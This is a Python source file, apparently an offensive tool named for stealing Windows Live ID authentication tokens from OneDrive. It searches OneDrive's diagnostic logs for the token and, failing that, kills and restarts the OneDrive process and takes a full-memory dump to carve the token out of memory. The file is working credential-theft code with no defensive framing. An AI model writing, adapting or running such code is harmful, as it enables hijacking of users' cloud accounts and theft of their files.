import time
import math
import os
import base64
import binascii
import psutil
import win32api
import win32con
import tempfile
from minidump.utils.createminidump import create_dump
import xml.etree.ElementTree as ET
import subprocess

from odl_parser.odl import get_odl_rows
from onedrive_info import OneDriveInfo, get_onedrive_info


WAIT_FOR_ONEDRIVE_TO_LOG_TOKEN_DELAY = 10
WAIT_FOR_ONEDRIVE_TO_SHUTDOWN_DELAY = 10
ODL_WLID_EXTRACTED_TOKEN_PREFIX = "WLID1.1 "
WLID_TOKEN_PREFIX = "WLID1.1 t="
WLID_TOKEN_PREFIX_BACKUP = "WLID1.1 "
ONEDRIVE_PROCESS_NAME = "OneDrive.exe"
ONEDRIVE_PROCESS_PROCDUMP_DESIRED_ACCESS = win32con.PROCESS_ALL_ACCESS
TOKEN_SEARCH_VALUES = [WLID_TOKEN_PREFIX, WLID_TOKEN_PREFIX_BACKUP]
MINIDUMP_TYPE_MiniDumpWithFullMemory = 2



def get_process_pid_by_name(process_name, username=None):
    for proc in psutil.process_iter():
        if process_name in proc.name():
            is_same_username = False
            try:
                proc_username = proc.username()
                is_same_username = username == proc_username
            except psutil.AccessDenied:
                pass
                
            if username and is_same_username:
                return proc.pid
    return None


def restart_onedrive(onedrive_info: OneDriveInfo, skip_shutdown: bool = False):
    if not skip_shutdown:
        current_user = win32api.GetUserNameEx(win32con.NameSamCompatible)
        onedrive_pid = get_process_pid_by_name(ONEDRIVE_PROCESS_NAME, username=current_user)
        os.kill(onedrive_pid)
    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def extract_wlid_token_from_buffer_in_index(dump_buffer, token_start_index):
    try:
            # Retrieve the token headers
            encoded_token_headers = dump_buffer[token_start_index:token_start_index + 16] # 16 is the minimum length to successfully decode the headers
            token_headers = base64.b64decode(encoded_token_headers.decode("UTF-16LE"))

            # Bytes 3-4 in the headers store the token length
            decoded_token_len = int.from_bytes(token_headers[2:4], byteorder='little')

            # Find the real token length of the base64 encoded token
            token_len = math.floor((4/3) * decoded_token_len)
            token_len += token_len % 4 # For token prefix

            # Retrieve the encoded token. We use token_len*2 because the token is encoded.
            encoded_token = dump_buffer[token_start_index: token_start_index + (token_len*2)]
            token = encoded_token.decode("UTF-16LE")

            # Check the token is a valid string and can be encoded
            if not token.isprintable():
                raise RuntimeError("The WLID was overwritten in OneDrive's memory")
            
            return token
        
    except (binascii.Error, UnicodeDecodeError, ValueError):
        raise RuntimeError("There was an error while extracting the WLID token from OneDrive's process dump")


def extract_wlid_token_from_buffer(dump_buffer: bytes) -> int:
    for token_search_value in TOKEN_SEARCH_VALUES:
        unicode_prefix_to_search = token_search_value.encode("UTF-16LE")

        token_start_index = dump_buffer.find(unicode_prefix_to_search)

        if token_start_index == -1:
            continue
        
        token_start_index += len(unicode_prefix_to_search) # Padding from token_start_index
        
        try:
            return extract_wlid_token_from_buffer_in_index(dump_buffer, token_start_index)
        except:
            extract_wlid_token_from_buffer(dump_buffer[token_start_index:])

    return None


def extract_windows_live_id_from_procdump(onedrive_pid = None):
    if None == onedrive_pid:
        current_user = win32api.GetUserNameEx(win32con.NameSamCompatible)
        onedrive_pid = get_process_pid_by_name(ONEDRIVE_PROCESS_NAME, username=current_user)
   
    tempfile_fd, tempfile_path = tempfile.mkstemp()
    os.close(tempfile_fd)
    create_dump(onedrive_pid, tempfile_path, MINIDUMP_TYPE_MiniDumpWithFullMemory) 
    
    with open(tempfile_path, "rb") as f:
        token = extract_wlid_token_from_buffer(f.read())

    os.remove(tempfile_path)

    return  f"{WLID_TOKEN_PREFIX}{token}"


def extract_windows_live_id_from_odls():
    odl_rows = get_odl_rows()
    latest_token_odl = None
    for odl in odl_rows[::-1]:
        if "NotificationServiceImpl::InternalConnect" == odl["Function"] or "CWNPTransportImpl::Connect" == odl["Function"]:
            latest_token_odl = odl
            break
 
    if None == latest_token_odl:
        return None

    root_xml_element = ET.fromstring(latest_token_odl["Params_Decoded"][1])
    wlid_ticket = root_xml_element.find("ssl-compact-ticket").text

    return f"{ODL_WLID_EXTRACTED_TOKEN_PREFIX}{wlid_ticket}"

def steal_onedrive_wlid_token():
    token = extract_windows_live_id_from_odls()
    if None == token:
        restart_onedrive(get_onedrive_info())
        time.sleep(WAIT_FOR_ONEDRIVE_TO_LOG_TOKEN_DELAY)
        token = extract_windows_live_id_from_odls()
        if None == token:
            token = extract_windows_live_id_from_procdump()
    return token